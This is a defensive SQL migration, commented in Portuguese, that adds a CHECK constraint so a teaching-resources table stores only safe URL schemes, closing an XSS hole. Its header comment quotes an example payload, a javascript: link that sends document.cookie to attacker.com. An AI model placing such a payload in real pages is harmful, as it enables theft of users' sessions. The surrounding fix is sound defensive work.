-- ============================================================
-- SECURITY FIX: bloquear schemes perigosos em recursos_pedagogicos.url_ficheiro
-- ============================================================
--
-- Vulnerabilidade:
--   `recursos_pedagogicos.url_ficheiro` é renderizado como href de
--   <a target="_blank">. Sem validação, qualquer professor podia gravar
--   `javascript:fetch('//attacker.com/'+document.cookie)` e os
--   utilizadores que clicassem executavam JS arbitrário (XSS via link).
--
-- Defesa em profundidade — 3 camadas:
--   1. Cliente (`novo-recurso-form.tsx`): validação UX em tempo real
--      via `isSafeUrl`.
--   2. Server action (`recursos/actions.ts`): Zod com `.refine(isSafeUrl)`.
--   3. Banco (esta migration): CHECK constraint — última linha de
--      defesa contra inserts directos via service-role ou bypass das
--      camadas anteriores.
--
-- Limpa também registos existentes que possam ter URLs perigosos
-- (seed.sql não tem nenhum mas seguro confirmar).
-- ============================================================

-- 1. Limpar registos existentes com URLs perigosos (defensivo)
UPDATE public.recursos_pedagogicos
   SET url_ficheiro = NULL
 WHERE url_ficheiro IS NOT NULL
   AND url_ficheiro !~* '^(https?|mailto)\:'
   AND url_ficheiro !~ '^[/#?]';

-- 2. CHECK constraint: aceitar NULL, paths relativos (/ # ?) ou
--    schemes http/https/mailto. Tudo o resto é rejeitado.
ALTER TABLE public.recursos_pedagogicos
  ADD CONSTRAINT recursos_url_ficheiro_safe
  CHECK (
    url_ficheiro IS NULL
    OR url_ficheiro ~* '^(https?|mailto)\:'
    OR url_ficheiro ~ '^[/#?]'
  );

COMMENT ON CONSTRAINT recursos_url_ficheiro_safe ON public.recursos_pedagogicos IS
'Defesa em profundidade contra XSS: rejeita URLs com scheme '
'javascript:, data:, vbscript:, file:, blob:, etc. quando '
'renderizado como href.';
